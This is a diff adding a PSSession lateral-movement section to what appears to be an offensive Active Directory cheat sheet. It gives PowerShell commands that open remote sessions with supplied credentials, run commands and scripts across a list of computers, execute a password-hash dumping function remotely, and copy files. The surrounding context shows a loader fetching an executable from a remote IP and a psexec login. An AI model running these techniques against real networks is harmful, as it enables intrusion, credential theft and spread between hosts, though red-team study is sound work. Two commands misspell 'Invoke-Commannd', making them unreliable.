@@ -13,6 +13,7 @@
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 * [Offensive .NET](#Offensive-.NET)
 * [Lateral Movement Techniques](#Lateral-Movement-Techniques)
+  * [PSSession](#PSSession) 
   * [PSExec](#PSExec)
   * [SC.exe](#SC.exe)
   * [Schtasks.exe](#schtasks.exe)
@@ -388,6 +389,44 @@ C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.x
 ```
 
 ## Lateral Movement Techniques
+
+### PSSession
+- Uses winrm / wmi
+#### Save pssession in variable
+```
+$sess = New-PSSession -Credential $creds -ComputerName <IP>
+```
+
+#### Run commands on machine
+```
+Invoke-Commannd -ScriptBlock {<COMMAND>} -Session $sess
+```
+
+#### Run commands on multiple machines
+```
+Invoke-Command –Scriptblock {<COMMAND>} -ComputerName (Get-Content computers.txt)
+```
+
+#### Load script on machine
+```
+Invoke-Commannd -Filepath <PATH TO SCRIPT> -Session $sess
+```
+
+#### Execute script on multiple machines
+```
+Invoke-Command –FilePath script.ps1 -ComputerName (Get-Content computers.txt)
+```
+
+#### Execute locally loaded function on remote machines:
+```
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content computers.txt)
+```
+
+#### Copy item through PSSession
+```
+Copy-Item -ToSession $sess -Path <PATH> -Destination <DEST> -verbose
+```
+
 ### PSexec
 ```
 psexec.exe -u <DOMAIN>\<USER> -p <PASSWORD> \\<TARGET> cmd.exe
